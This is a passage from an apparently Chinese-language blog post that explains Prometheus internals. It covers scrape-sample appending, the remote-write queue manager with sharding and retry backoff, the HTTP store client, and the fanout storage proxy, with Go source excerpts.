class="keyword">if</span> lset == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.addDropped(mets)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ref <span class="keyword">uint64</span></span><br><span class="line">ref, err = app.Add(lset, t, v)</span><br><span class="line"><span class="comment">// TODO(fabxc): also add a dropped-cache?</span></span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of order sample"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfOrder.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Duplicate sample for timestamp"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleDuplicate.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfBounds:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numOutOfBounds++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of bounds metric"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfBounds.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> errSampleLimit:</span><br><span class="line">sampleLimitErr = err</span><br><span class="line">added++</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"unexpected error"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met), <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">break</span> loop</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> tp == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Bypass staleness logic if there is an explicit timestamp.</span></span><br><span class="line">sl.cache.trackStaleness(hash, lset)</span><br><span class="line">&#125;</span><br><span class="line">sl.cache.addRef(mets, ref, lset, hash)</span><br><span class="line">&#125;</span><br><span class="line">added++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">err = p.Err()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> sampleLimitErr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// We only want to increment this once per scrape, so this is Inc'd outside the loop.</span></span><br><span class="line">targetScrapeSampleLimit.Inc()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfOrder &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting out-of-order samples"</span>, <span class="string">"num_dropped"</span>, numOutOfOrder)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numDuplicates &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting samples with different value but same timestamp"</span>, <span class="string">"num_dropped"</span>, numDuplicates)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfBounds &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting samples that are too old or are too far into the future"</span>, <span class="string">"num_dropped"</span>, numOutOfBounds)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.forEachStale(<span class="function"><span class="keyword">func</span><span class="params">(lset labels.Labels)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="comment">// Series no longer exposed, mark it stale.</span></span><br><span class="line">_, err = app.Add(lset, defTime, math.Float64frombits(value.StaleNaN))</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line"><span class="comment">// Do not count these in logging, as this is expected if a target</span></span><br><span class="line"><span class="comment">// goes away and comes back again with a new scrape loop.</span></span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err == <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">app.Rollback()</span><br><span class="line"><span class="keyword">return</span> total, added, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := app.Commit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> total, added, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sl.cache.iterDone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> total, added, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存储指标append方法的具体实现，</p><p>存储指标的流程：</p><p><img src="/images/1572417134533.png" alt="1572417134533"></p><p>prometheus支持远程存储，也支持本地存储。</p><p>remote中为远程存储，</p><p>tsdb中为本地存储</p><p>远程存储：存储的数据，发送过来的样本先放入到队列中，这个队列的最大分片是1000，每个分片没秒1000个sample，那么一秒就可以发送1000*1000个sample。</p><p>数据结构为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QueueManager manages a queue of samples to be sent to the Storage</span></span><br><span class="line"><span class="comment">// indicated by the provided StorageClient.</span></span><br><span class="line"><span class="keyword">type</span> QueueManager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">cfg            config.QueueConfig                     <span class="comment">//队列配置</span></span><br><span class="line">externalLabels model.LabelSet                         <span class="comment">//</span></span><br><span class="line">relabelConfigs []*config.RelabelConfig </span><br><span class="line">client         StorageClient                          <span class="comment">// 存储客户端</span></span><br><span class="line">queueName      <span class="keyword">string</span>                                 <span class="comment">//队列名称</span></span><br><span class="line">logLimiter     *rate.Limiter                          <span class="comment">//限流</span></span><br><span class="line"> </span><br><span class="line">shardsMtx   sync.Mutex</span><br><span class="line">shards      *shards                                   <span class="comment">//分片</span></span><br><span class="line">numShards   <span class="keyword">int</span>                                       <span class="comment">//分片数目</span></span><br><span class="line">reshardChan <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line">quit        <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">wg          sync.WaitGroup</span><br><span class="line"></span><br><span class="line">samplesIn, samplesOut, samplesOutDuration *ewmaRate</span><br><span class="line">integralAccumulator                       <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构建好发送队列的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewQueueManager builds a new QueueManager.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueueManager</span><span class="params">(logger log.Logger, cfg config.QueueConfig, externalLabels model.LabelSet, relabelConfigs []*config.RelabelConfig, client StorageClient)</span> *<span class="title">QueueManager</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line">t := &amp;QueueManager&#123;</span><br><span class="line">logger:         logger,</span><br><span class="line">cfg:            cfg,</span><br><span class="line">externalLabels: externalLabels,</span><br><span class="line">relabelConfigs: relabelConfigs,</span><br><span class="line">client:         client,</span><br><span class="line">queueName:      client.Name(),</span><br><span class="line"></span><br><span class="line">logLimiter:  rate.NewLimiter(logRateLimit, logBurst),</span><br><span class="line">numShards:   <span class="number">1</span>,</span><br><span class="line">reshardChan: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>),</span><br><span class="line">quit:        <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line"></span><br><span class="line">samplesIn:          newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">samplesOut:         newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">samplesOutDuration: newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">&#125;</span><br><span class="line">t.shards = t.newShards(t.numShards)</span><br><span class="line">numShards.WithLabelValues(t.queueName).Set(<span class="keyword">float64</span>(t.numShards))</span><br><span class="line">queueCapacity.WithLabelValues(t.queueName).Set(<span class="keyword">float64</span>(t.cfg.Capacity))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialise counter labels to zero.</span></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">sentBatchDuration.WithLabelValues(t.queueName)                  </span><br><span class="line">succeededSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line">failedSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line">droppedSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line"><span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用append方法来添加样本数据到队列分片中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Append queues a sample to be sent to the remote storage. It drops the</span></span><br><span class="line"><span class="comment">// sample on the floor if the queue is full.</span></span><br><span class="line"><span class="comment">// Always returns nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *QueueManager)</span> <span class="title">Append</span><span class="params">(s *model.Sample)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> snew model.Sample</span><br><span class="line">snew = *s</span><br><span class="line">snew.Metric = s.Metric.Clone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> t.externalLabels &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := s.Metric[ln]; !ok &#123;</span><br><span class="line">snew.Metric[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">snew.Metric = model.Metric(</span><br><span class="line">relabel.Process(model.LabelSet(snew.Metric), t.relabelConfigs...))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> snew.Metric == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t.shardsMtx.Lock()</span><br><span class="line">enqueued := t.shards.enqueue(&amp;snew)</span><br><span class="line">t.shardsMtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> enqueued &#123;</span><br><span class="line">queueLength.WithLabelValues(t.queueName).Inc()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">droppedSamplesTotal.WithLabelValues(t.queueName).Inc()</span><br><span class="line"><span class="keyword">if</span> t.logLimiter.Allow() &#123;</span><br><span class="line">level.Warn(t.logger).Log(<span class="string">"msg"</span>, <span class="string">"Remote storage queue full, discarding sample. Multiple subsequent messages of this kind may be suppressed."</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中使用的函数enqueue发送到队列里面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">enqueue</span><span class="params">(sample *model.Sample)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">s.qm.samplesIn.incr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fp := sample.Metric.FastFingerprint()</span><br><span class="line">shard := <span class="keyword">uint64</span>(fp) % <span class="keyword">uint64</span>(<span class="built_in">len</span>(s.queues))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> s.queues[shard] &lt;- sample:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个队列存储里面用余数去分组的。</p><p>使用start方法来启动队列发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s.queues); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> s.runShard(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数runShared生成多个协程去执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">runShard</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">queue := s.queues[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send batches of at most MaxSamplesPerSend samples to the remote storage.</span></span><br><span class="line"><span class="comment">// If we have fewer samples than that, flush them out after a deadline</span></span><br><span class="line"><span class="comment">// anyways.</span></span><br><span class="line">pendingSamples := model.Samples&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> sample, ok := &lt;-queue:</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pendingSamples) &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Debug(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Flushing samples to remote storage..."</span>, <span class="string">"count"</span>, <span class="built_in">len</span>(pendingSamples))</span><br><span class="line">s.sendSamples(pendingSamples)</span><br><span class="line">level.Debug(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Done flushing."</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">queueLength.WithLabelValues(s.qm.queueName).Dec()</span><br><span class="line">pendingSamples = <span class="built_in">append</span>(pendingSamples, sample)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(pendingSamples) &gt;= s.qm.cfg.MaxSamplesPerSend &#123;</span><br><span class="line">s.sendSamples(pendingSamples[:s.qm.cfg.MaxSamplesPerSend])</span><br><span class="line">pendingSamples = pendingSamples[s.qm.cfg.MaxSamplesPerSend:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(s.qm.cfg.BatchSendDeadline):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pendingSamples) &gt; <span class="number">0</span> &#123;</span><br><span class="line">s.sendSamples(pendingSamples)</span><br><span class="line">pendingSamples = pendingSamples[:<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用了方法sendSamples去发送样本：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">sendSamples</span><span class="params">(samples model.Samples)</span></span> &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line">s.sendSamplesWithBackoff(samples)</span><br><span class="line"></span><br><span class="line"><span class="comment">// These counters are used to caclulate the dynamic sharding, and as such</span></span><br><span class="line"><span class="comment">// should be maintained irrespective of success or failure.</span></span><br><span class="line">s.qm.samplesOut.incr(<span class="keyword">int64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line">s.qm.samplesOutDuration.incr(<span class="keyword">int64</span>(time.Since(begin)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中方法使用了samplesOut和samplesOutDuration来计算分片的动态变化。保证成功发送和失败的数目。</p><p>启动调用函数sendSamplesWithBackOff函数来保证远程发送的时候失败的情况：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">sendSamplesWithBackoff</span><span class="params">(samples model.Samples)</span></span> &#123;</span><br><span class="line">backoff := s.qm.cfg.MinBackoff</span><br><span class="line"><span class="keyword">for</span> retries := s.qm.cfg.MaxRetries; retries &gt; <span class="number">0</span>; retries-- &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line">req := ToWriteRequest(samples)</span><br><span class="line">err := s.qm.client.Store(req)</span><br><span class="line"></span><br><span class="line">sentBatchDuration.WithLabelValues(s.qm.queueName).Observe(time.Since(begin).Seconds())</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">succeededSamplesTotal.WithLabelValues(s.qm.queueName).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">level.Warn(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error sending samples to remote storage"</span>, <span class="string">"count"</span>, <span class="built_in">len</span>(samples), <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">if</span> _, ok := err.(recoverableError); !ok &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(backoff)</span><br><span class="line">backoff = backoff * <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> backoff &gt; s.qm.cfg.MaxBackoff &#123;</span><br><span class="line">backoff = s.qm.cfg.MaxBackoff</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">failedSamplesTotal.WithLabelValues(s.qm.queueName).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果发送失败会重试几次，如果还是失败，会将发送失败的样本计入失败的计算器。</p><p>如果成功，会调用Client中的Store方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span> <span class="title">Store</span><span class="params">(req *prompb.WriteRequest)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">data, err := proto.Marshal(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">compressed := snappy.Encode(<span class="literal">nil</span>, data)</span><br><span class="line">httpReq, err := http.NewRequest(<span class="string">"POST"</span>, c.url.String(), bytes.NewReader(compressed))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Errors from NewRequest are from unparseable URLs, so are not</span></span><br><span class="line"><span class="comment">// recoverable.</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">httpReq.Header.Add(<span class="string">"Content-Encoding"</span>, <span class="string">"snappy"</span>)</span><br><span class="line">httpReq.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-protobuf"</span>)</span><br><span class="line">httpReq.Header.Set(<span class="string">"X-Prometheus-Remote-Write-Version"</span>, <span class="string">"0.1.0"</span>)</span><br><span class="line"></span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), c.timeout)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">httpResp, err := ctxhttp.Do(ctx, c.client, httpReq)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Errors from client.Do are from (for example) network errors, so are</span></span><br><span class="line"><span class="comment">// recoverable.</span></span><br><span class="line"><span class="keyword">return</span> recoverableError&#123;err&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> httpResp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> httpResp.StatusCode/<span class="number">100</span> != <span class="number">2</span> &#123;</span><br><span class="line">scanner := bufio.NewScanner(io.LimitReader(httpResp.Body, maxErrMsgLen))</span><br><span class="line">line := <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> scanner.Scan() &#123;</span><br><span class="line">line = scanner.Text()</span><br><span class="line">&#125;</span><br><span class="line">err = fmt.Errorf(<span class="string">"server returned HTTP status %s: %s"</span>, httpResp.Status, line)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> httpResp.StatusCode/<span class="number">100</span> == <span class="number">5</span> &#123;</span><br><span class="line"><span class="keyword">return</span> recoverableError&#123;err&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过post方式，发送数据。</p><p>本地存储主要使用的tsdb库中，后面的版本对tsdb有较为大的变化。</p><p>fanout为本地和远程的读写代理器，入口在fanout中，fanout的数据结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> fanout <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">primary     Storage</span><br><span class="line">secondaries []Storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化数据结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewFanout returns a new fan-out Storage, which proxies reads and writes</span></span><br><span class="line"><span class="comment">// through to multiple underlying storages.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFanout</span><span class="params">(logger log.Logger, primary Storage, secondaries ...Storage)</span> <span class="title">Storage</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;fanout&#123;</span><br><span class="line">logger:      logger,</span><br><span class="line">primary:     primary,</span><br><span class="line">secondaries: secondaries,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加数据使用appender方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *fanout)</span> <span class="title">Appender</span><span class="params">()</span> <span class="params">(Appender, error)</span></span> &#123;</span><br><span class="line">primary, err := f.primary.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">secondaries := <span class="built_in">make</span>([]Appender, <span class="number">0</span>, <span class="built_in">len</span>(f.secondaries))</span><br><span class="line"><span class="keyword">for</span> _, storage := <span class="keyword">range</span> f.secondaries &#123;</span><br><span class="line">appender, err := storage.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">secondaries = <span class="built_in">append</span>(secondaries, appender)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;fanoutAppender&#123;</span><br><span class="line">logger:      f.logger,</span><br><span class="line">primary:     